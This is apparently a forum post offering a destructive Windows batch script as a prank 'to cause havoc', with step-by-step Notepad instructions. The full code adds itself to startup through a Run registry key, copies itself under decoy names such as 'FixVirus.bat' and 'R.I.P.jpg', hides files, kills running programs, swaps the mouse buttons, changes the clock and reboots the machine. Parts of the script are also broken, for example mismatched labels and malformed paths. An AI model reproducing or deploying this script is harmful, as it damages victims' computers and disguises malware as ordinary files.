
This is a very nice little one to cause havoc!

What it does:

1) Copy itself into startup,
2) Copy itself over one thousand times into random spots in your computer,
3) Hide its self and all other created files,
4) Task kill MSN, Norton, Windows Explorer and Limewire,
5) Swap the left mouse button with the right one,
6) Opens alert boxes,
7) Changes the time to 12:00 and shuts down the computer.

How to do it:

Step 1: Open Notepad
Step 2: Write this in:

Code:
@Echo off
color 4
title 4
title R.I.P
start
start
start
start calc
copy %0 %Systemroot%\Greatgame > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Greatgame /t REG_SZ
/d %systemroot%\Greatgame.bat /f > nul
copy %0 *.bat > nul
Attrib +r +h Greatgame.bat
Attrib +r +h
RUNDLL32 USER32.DLL.SwapMouseButton
start calc
cls
tskill msnmsgr
tskill LimeWire
tskill iexplore
tskill NMain
start
cls
cd %userprofile%\desktop
copy Greatgame.bat R.I.P.bat
copy Greatgame.bat R.I.P.jpg
copy Greatgame.bat R.I.P.txt
copy Greatgame.bat R.I.P.exe
copy Greatgame.bat R.I.P.mov
copy Greatgame.bat FixVirus.bat
cd %userprofile%My Documents
copy Greatgame.bat R.I.P.bat
copy Greatgame.bat R.I.P.jpg
copy Greatgame.bat R.I.P.txt
copy Greatgame.bat R.I.P.exe
copy Greatgame.bat R.I.P.mov
copy Greatgame.bat FixVirus.bat
start
start calc
cls
msg * R.I.P
msg * R.I.P
wmic os where primary=1 reboot
start
start
time 12:00
:R.I.P
cd %usernameprofile%\desktop
copy Greatgame.bat %random%.bat
goto RIP
